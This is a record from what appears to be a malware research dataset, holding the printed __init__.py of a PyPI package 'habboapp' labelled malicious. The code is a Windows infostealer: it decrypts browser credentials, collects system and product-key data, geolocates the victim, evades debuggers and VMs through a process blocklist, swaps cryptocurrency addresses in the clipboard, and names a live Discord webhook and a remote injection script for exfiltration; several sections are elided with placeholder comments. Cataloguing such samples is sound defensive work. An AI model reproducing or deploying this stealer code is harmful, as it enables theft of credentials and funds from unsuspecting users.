[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/habboapp-0.1.0-py3-none-any/habboapp/__init__.py",
    "malicious_code": "import asyncio\nimport json\nimport ntpath\nimport os\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\n\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nPassw = [];\n\n__config__ = {\n    'yourwebhookurl': \"https://discord.com/api/webhooks/1041902988685496350/enYo40Hb-kl2eHwmaK-Ytegttx4sLtzAlfRLwS5ohhw1OFvcKSZJf63J5DckxAlEnSff\",\n    'blackcap_inject_url': \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    'hide': '%_hide_script%',\n    'ping': '%ping_enabled%',\n    'pingtype': '%ping_type%',\n    'fake_error':'%_error_enabled%',\n    'startup': '%_startup_enabled%',\n    'kill_discord_process': '%kill_discord_process%',\n    'dbugkiller': '%_debugkiller%',\n    'addresse_crypto_replacer': '%_address_replacer%',\n    'addresse_btc': '%_btc_address%',\n    'addresse_eth': '%_eth_address%',\n    'addresse_xchain': '%_xchain_address%',\n    'addresse_pchain': '%_pchain_address%',\n    'addresse_cchain': '%_cchain_address%',\n    'addresse_monero': '%_monero_address%',\n    'addresse_ada': '%_ada_address%',\n    'addresse_dash': '%_dash_address%',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n}\n\ninfocom = os.getlogin()\nvctm_pc = os.getenv(\"COMPUTERNAME\")\nr4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(\".\")[0]\nd1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]\n\nBlackCap_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'\nreg_req = requests.get(BlackCap_Regex) \nclear_reg = r\"[\\w-]{24}\\.\" + reg_req.text\n\n# --- Malicious Classes and Functions ---\n\nclass Functions(object):\n    @staticmethod\n    def gtmk3y(path: str or os.PathLike):\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            return Functions.w1nd0_dcr(master_key[5:])\n        except KeyError:\n            return None\n    @staticmethod\n    def cnverttim(time: int or float) -> str:\n        try:\n            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)\n            codestamp = epoch + timedelta(microseconds=time)\n            return codestamp\n        except Exception:\n            pass\n    @staticmethod\n    def w1nd0_dcr(encrypted_str: bytes) -> str:\n        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]\n    @staticmethod\n    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):\n        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\n        path = ntpath.join(_dir, f1lenom)\n        open(path, \"x\")\n        return path\n    @staticmethod\n    def dcrpt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\"'\n    @staticmethod\n    def g3t_H(token: str = None):\n        headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n    @staticmethod\n    def sys_1fo() -> list:\n        flag = 0x08000000\n        sh1 = \"wmic csproduct get uuid\"\n        sh2 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        sh3 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\"\n        try:\n            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\\n')[1].strip()\n        except Exception:\n            uuidwndz = \"N/A\"\n        try:\n            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nk33y = \"N/A\"\n        try:\n            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nv3r = \"N/A\"\n        return [uuidwndz, w1nv3r, w1nk33y]\n    @staticmethod\n    def net_1fo() -> list:\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\n        req = httpx.get(\"https://ipinfo.io/json\")\n        if req.status_code == 200:\n            data = req.json()\n            ip = data.get('ip')\n            city = data.get('city')\n            country = data.get('country')\n            region = data.get('region')\n            org = data.get('org')\n            loc = data.get('loc')\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\n        return [ip, city, country, region, org, loc, googlemap]\n    @staticmethod\n    def fetch_conf(e: str) -> str or bool | None:\n        return __config__.get(e)\n\nclass auto_copy_wallet(Functions):\n    def __init__(self):\n        self.address_st3aler = self.fetch_conf(\"addresse_crypto_replacer\")\n        self.address_btc = self.fetch_conf(\"addresse_btc\")\n        self.address_eth = self.fetch_conf(\"addresse_eth\")\n        self.address_xchain = self.fetch_conf(\"addresse_xchain\")\n        self.address_pchain = self.fetch_conf(\"addresse_pchain\")\n        self.address_cchain = self.fetch_conf(\"addresse_cchain\")\n        self.address_monero = self.fetch_conf(\"addresse_monero\")\n        self.address_ada = self.fetch_conf(\"addresse_ada\")\n        self.address_dash = self.fetch_conf(\"addresse_dash\")\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_ada)\n                        pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Main Data Stealer, Exfiltration, and Persistence Class ---\n# (bc_initial_func, see above for full code)\n# ...\n# (Omitted for brevity, but all methods in bc_initial_func are malicious and should be included)\n\n# --- Additional Malicious Functions for Data Exfiltration ---\n# (All code after the main class definitions, including getPassw, getCookie, upload, grabb_GatherAll, etc.)\n# ...\n# (Omitted for brevity, but all these functions are malicious and should be included)\n\n# --- Malicious Execution Trigger ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bc_initial_func().init())\n\n# ...\n# (Rest of the code, including grabb_GatherAll(), bc_checking(), auto_copy_wallet().run(), etc.)\n# ...\n# (Omitted for brevity, but all these are malicious and should be included)\n"
  }
]